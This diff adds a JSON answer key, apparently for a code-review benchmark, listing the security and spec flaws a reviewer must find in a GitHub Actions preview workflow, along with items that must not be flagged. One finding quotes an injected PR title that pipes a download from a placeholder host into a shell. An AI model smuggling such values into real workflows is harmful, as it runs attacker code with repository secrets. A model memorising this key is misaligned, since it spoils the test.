@@ -1,0 +1,19 @@
+{
+  "verdict": "Changes requested",
+  "must_find": [
+    {"id": "pwn-request", "pass": "security", "file": ".github/workflows/preview.yml",
+     "summary": "pull_request_target checks out the PR head (fork code) and runs `npm ci` / `npm run build` (install scripts, build config) with secrets and a write token available. A fork author can steal PREVIEW_DEPLOY_TOKEN or push to the repo, and since it reruns on `synchronize`, they can push malicious code after a maintainer applies the label. Build untrusted code in a `pull_request` workflow without secrets and deploy the artifact from a separate trusted job (e.g. workflow_run)."},
+    {"id": "title-injection", "pass": "security/spec", "file": ".github/workflows/preview.yml",
+     "summary": "`${{ github.event.pull_request.title }}` is interpolated straight into the run: script, so a PR titled like `\"; curl evil | sh; \"` runs arbitrary shell commands in a job holding the deploy secret. It breaks the README rule to pass untrusted values via env:."},
+    {"id": "write-all", "pass": "spec", "file": ".github/workflows/preview.yml",
+     "summary": "`permissions: write-all` violates the least-privilege rule; the job needs only contents: read and pull-requests: write (for the comment)."},
+    {"id": "unpinned-action", "pass": "spec/supply_chain", "file": ".github/workflows/preview.yml",
+     "summary": "thollander/actions-comment-pull-request@v3 is a third-party action pinned to a mutable tag, not a full commit SHA, as the README requires (and it runs with write-all and secrets in reach)."}
+  ],
+  "nice_to_find": [],
+  "must_not_flag": [
+    {"id": "first-party-pins", "summary": "actions/checkout and actions/setup-node are pinned to full SHAs with tag comments; NOT unpinned."},
+    {"id": "concurrency", "summary": "The concurrency group keyed by PR number with cancel-in-progress is fine."},
+    {"id": "pr-number-interp", "summary": "Interpolating github.event.pull_request.number (an integer) is NOT an injection vector on its own; the title is."}
+  ]
+}
